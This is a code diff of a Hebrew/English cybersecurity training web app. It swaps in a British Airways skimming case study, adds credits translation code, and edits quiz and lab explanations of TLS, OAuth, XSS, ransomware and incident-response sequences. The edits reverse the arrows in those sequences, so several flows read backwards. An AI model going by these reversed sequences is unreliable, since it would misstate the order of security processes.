-<tr><td>ISO 27001</td><td>כל ארגון, בינ"ל</td><td>ISMS — ניהול מערכתי</td><td>בינלאומי נפוץ</td></tr>
-<tr><td>SOC 2 Type II</td><td>SaaS, Tech</td><td>Security, Availability, Privacy</td><td>דרישת לקוח ב-US</td></tr>
-<tr><td>PCI DSS</td><td>כל מי שמעבד CC</td><td>כרטיסי אשראי</td><td>חובה עם קנסות</td></tr>
-<tr><td>HIPAA</td><td>Healthcare ב-US</td><td>Health data</td><td>נדרש בארה"ב</td></tr>
-</tbody></table></div>
-
-<div class="incident-box">
-  <div class="incident-title">🔥 אירוע אמיתי: Meta — 2023, קנס GDPR של €1.2 מיליארד</div>
-  <div class="incident-body">
-    הקנס הגדול ביותר בהיסטוריית GDPR: הרגולטור האירי קנס את Meta על העברת נתוני אירופאים לארה"ב ללא מנגנוני הגנה מספקים. Meta ממשיכה לערער.<br><br>
-    <strong>ההשלכה לכל ארגון:</strong> Data transfers מהEU לארה"ב דורשים Standard Contractual Clauses (SCCs) או Adequacy Decision. לא "המידע בענן של אמריקאי" — זה לא מספיק. Privacy by Design ו-Data Minimization הם לא אופציונלים.
+<div class="real-world-box">
+  <div class="real-world-title">🌍 Case Study: British Airways — GDPR בפועל</div>
+  <div class="real-world-body">
+    ב-2018 גנבו האקרים נתוני כרטיסי אשראי ופרטים אישיים של 500,000 לקוחות British Airways. הפריצה נמשכה חודשיים. ICO (הרגולטור הבריטי) קנסה את British Airways בתחילה £183 מיליון — 1.5% ממחזורה. בסוף הסתדרו על £20 מיליון עקב COVID-19.<br><br>
+    מה שנכשל: Skimming script הוזרק לאתר, נתוני לקוחות נשלחו לשרת חיצוני. Detection לקח חודשיים. <strong>הלקח: Content Security Policy ו-Subresource Integrity היו מונעים את ה-injection. פשוט ולא יקר — אם יישמת.</strong>
   </div>
 </div>`
   ],
@@ -1283,7 +1299,7 @@ last && lastb                 <span class="comment"># login history + failures</
 }};
 // Interactive lab exercises — per chapter
 // Each exercise: {q, type, check, hints, explain, [options/template/expected]}
-// Types: 'fill' (fill in blank), 'classify' (drag/click to classify), 'order' (sequence), 'mchoice' (scenario → pick best action)
+// Types: 'fill' (fill in blank), 'classify' (drag/click to classify), 'order' (sequence), 'mchoice' (scenario ← pick best action)
 
 const ILABS = {
 0:[ // מבוא
@@ -1315,7 +1331,7 @@ const ILABS = {
       {id:'a', text:'👤 Identity & MFA'},
     ],
     correct:['b','c','d','e','a'],
-    explain:'Perimeter (firewall) → Network (segmentation) → Endpoint (AV) → Data (encryption) → Identity (MFA). כל שכבה מעצבת את הבאה.'
+    explain:'Perimeter (firewall) ← Network (segmentation) ← Endpoint (AV) ← Data (encryption) ← Identity (MFA). כל שכבה מעצבת את הבאה.'
   },
   {
     type:'mchoice',
@@ -1383,7 +1399,7 @@ const ILABS = {
       {id:'b', text:'📜 Server sends Certificate'},
     ],
     correct:['a','b','c','d'],
-    explain:'TLS: Client Hello → Server Certificate → Key Derivation → Encrypted Data. Asymmetric בהתחלה, Symmetric לנתונים.'
+    explain:'TLS: Client Hello ← Server Certificate ← Key Derivation ← Encrypted Data. Asymmetric בהתחלה, Symmetric לנתונים.'
   },
   {
     type:'fill',
@@ -1425,7 +1441,7 @@ const ILABS = {
       {id:'c', text:'🔐 Apply least privilege access'},
     ],
     correct:['a','b','c','d'],
-    explain:'Identity first → Device health → Least privilege → Continuous monitoring. Zero Trust לא נגמר בlogin — המעקב הוא רציף.'
+    explain:'Identity first ← Device health ← Least privilege ← Continuous monitoring. Zero Trust לא נגמר בlogin — המעקב הוא רציף.'
   },
   {
     type:'mchoice',
@@ -1487,7 +1503,7 @@ const ILABS = {
       {id:'b', text:'💾 Server saves malicious comment to database'},
     ],
     correct:['a','b','c','d'],
-    explain:'Stored XSS: פרסום → שמירה בDB → הרצה על כל visitor → גנבת session. לכן "Stored" = מסוכן יותר מReflected.'
+    explain:'Stored XSS: פרסום ← שמירה בDB ← הרצה על כל visitor ← גנבת session. לכן "Stored" = מסוכן יותר מReflected.'
   },
   {
     type:'fill',
@@ -1541,7 +1557,7 @@ const ILABS = {
       {id:'c', text:'↩️ Google redirects back with authorization code'},
     ],
     correct:['a','b','c','d','e'],
-    explain:'Authorization Code Flow: redirect → user consent → code → token exchange → API access. המשתמש לא נחשף לapp credentials.'
+    explain:'Authorization Code Flow: redirect ← user consent ← code ← token exchange ← API access. המשתמש לא נחשף לapp credentials.'
   },
   {
     type:'fill',
@@ -1564,7 +1580,7 @@ const ILABS = {
       {id:'b', text:'"שלום נועה, ראיתי שאת VP Engineering ב-Acme..." — מייל ממוקד', ans:'SPEAR'},
       {id:'c', text:'שיחה טלפונית: "אני מה-IT, צריך סיסמתך לתמיכה"', ans:'VISH'},
       {id:'d', text:'"שלום CEO, צריכה העברת $200K דחופה" — מייל לCFO', ans:'WHALE'},
-      {id:'e', text:'USB נמצא בחניה — מחובר למחשב → malware', ans:'PHYS'},
+      {id:'e', text:'USB נמצא בחניה — מחובר למחשב ← malware', ans:'PHYS'},
       {id:'f', text:'SMS: "חשבונך ננעל, לחצי כאן"', ans:'SMISH'},
     ],
     categories:['🎣 Phishing','🎯 Spear Phishing','🐳 Whaling','📞 Vishing','📱 Smishing','🔌 Physical'],
@@ -1582,7 +1598,7 @@ const ILABS = {
       {id:'a', text:'📧 Phishing email opened — initial access'},
     ],
     correct:['a','b','c','d','e'],
-    explain:'Phishing → Execute → Lateral Movement → Encrypt → Ransom. שים לב: הצפנה מגיעה בסוף — לאחר שהתוקף כבר בכל הרשת.'
+    explain:'Phishing ← Execute ← Lateral Movement ← Encrypt ← Ransom. שים לב: הצפנה מגיעה בסוף — לאחר שהתוקף כבר בכל הרשת.'
   },
   {
     type:'mchoice',
@@ -1620,7 +1636,7 @@ const ILABS = {
       {id:'b', text:'🚨 Detection & Analysis — זיהוי ואימות האירוע'},
     ],
     correct:['a','b','c','d','e','f'],
-    explain:'NIST IR: Preparation → Detection → Containment → Eradication → Recovery → Lessons Learned. לא מדלגים שלבים!'
+    explain:'NIST IR: Preparation ← Detection ← Containment ← Eradication ← Recovery ← Lessons Learned. לא מדלגים שלבים!'
   },
   {
     type:'order',
@@ -1632,7 +1648,7 @@ const ILABS = {
       {id:'a', text:'⚡ CPU Registers & Cache'},
     ],
     correct:['a','b','c','d'],
-    explain:'CPU registers → Network → RAM → Disk. Reboot מאבד את CPU+Network+RAM לגמרי. תמיד שמרי volatile data קודם לפני כל פעולה.'
+    explain:'CPU registers ← Network ← RAM ← Disk. Reboot מאבד את CPU+Network+RAM לגמרי. תמיד שמרי volatile data קודם לפני כל פעולה.'
   },
   {
     type:'mchoice',
@@ -1700,7 +1716,7 @@ const ILABS = {
       {id:'c', text:'🛠️ Risk Treatment — Mitigate/Transfer/Accept/Avoid'},
     ],
     correct:['a','b','c','d'],
-    explain:'Assets → Risk Assessment → Treatment → Monitor. Risk management הוא מחזור — לא one-time. Monitor מוביל לassessment מחדש.'
+    explain:'Assets ← Risk Assessment ← Treatment ← Monitor. Risk management הוא מחזור — לא one-time. Monitor מוביל לassessment מחדש.'
   },
   {
     type:'fill',
@@ -2134,7 +2150,7 @@ const ILABS_EN = {
     type:'fill',
     q:'Complete: GDPR details every developer must know',
     fields:[
-      {label:'Max time to report breach to regulator', placeholder:'Number + unit', answer:'72 hours', alt:['72 hours','72h','72 שעות']},
+      {label:'Max time to report breach to regulator', placeholder:'Number + unit', answer:'72 hours', alt:['72 hours','72h','72 hours']},
       {label:'Max fine as % of turnover', placeholder:'Percentage', answer:'4%', alt:['4%','4 percent','four percent']},
       {label:'Principle: collect only essential data', placeholder:'Principle name', answer:'data minimization', alt:['data minimization','minimization']},
       {label:'User right to delete all their data', placeholder:'Right name', answer:'right to erasure', alt:['right to erasure','erasure','right to be forgotten']},
@@ -2189,7 +2205,7 @@ const QUIZZES = {
   {q:"91% מהתקפות הסייבר מתחילות ב:",o:["zero-day exploit","phishing email","brute force","SQL injection"],a:1,e:"הגורם האנושי הוא נקודת הכניסה הכי נפוצה. security awareness training = הגנה קריטית."}
 ],
 6:[
-  {q:"מה Order of Volatility?",o:["סדר מחיקת עדויות","סדר שימור ראיות מהנדיפות לעמידה","חומרת האירוע","מהירות תגובה"],a:1,e:"RAM נייד יותר מDisk. תמיד לשמור: CPU registers → Network → RAM → Disk. Reboot = אובדן RAM."},
+  {q:"מה Order of Volatility?",o:["סדר מחיקת עדויות","סדר שימור ראיות מהנדיפות לעמידה","חומרת האירוע","מהירות תגובה"],a:1,e:"RAM נייד יותר מDisk. תמיד לשמור: CPU registers ← Network ← RAM ← Disk. Reboot = אובדן RAM."},
   {q:"MTTR בתחום אבטחה:",o:["Maximum Threat Response Time","Mean Time To Respond — זמן תגובה ממוצע","Monthly Threat Rate","Minimum Threat Resolution"],a:1,e:"MTTR הממוצע = 207 ימים לזיהוי + 73 להכלה. תוקף יכול לשבת ברשת 9 חודשים."},
   {q:"בשלב Containment של IR:",o:["מוחקים את הmalware","מבודדים מערכות נגועות מיידית","מדווחים לרגולטור","מחזירים לפעילות"],a:1,e:"Containment = isolation מיידי. לחתוך את ה-network access של מערכות נגועות לפני eradication."},
   {q:"IOC = Indicator of Compromise. דוגמה:",o:["IP address חשוד","firewall rule","password policy","backup schedule"],a:0,e:"IOCs כוללים: IP/domain חשודים, file hashes, registry keys, scheduled tasks חריגים."},
@@ -2808,6 +2824,34 @@ function applyLang(lang) {
   if(t==='quiz') renderQuiz(state.cur);
   if(t==='lab')  renderLab(state.cur);
   if(t==='game') renderGame(state.cur);
+
+  // Credits bar translation
+  const creditsLabels = {
+    he: {
+      title: '// מקורות ותודות',
+      research: 'מחקר ותקנים',
+      incidents: 'ניתוח אירועים',
+      tech: 'תיעוד טכני',
+      built: 'נבנה עם',
+      version: 'גרסה 2.0 — 2025'
+    },
+    en: {
+      title: '// Sources & Credits',
+      research: 'Research & Standards',
+      incidents: 'Incident Analysis',
+      tech: 'Technical Docs',
+      built: 'Built With',
+      version: 'Version 2.0 — 2025'
+    }
+  };
+  const cl2 = creditsLabels[lang] || creditsLabels.he;
+  const setT = (id, txt) => { const el = document.getElementById(id); if(el) el.textContent = txt; };
+  setT('credits-title-label', cl2.title);
+  setT('credits-research', cl2.research);
+  setT('credits-incidents', cl2.incidents);
+  setT('credits-tech', cl2.tech);
+  setT('credits-built', cl2.built);
+  setT('credits-version', cl2.version);
 }
 
 // ===== NAV =====
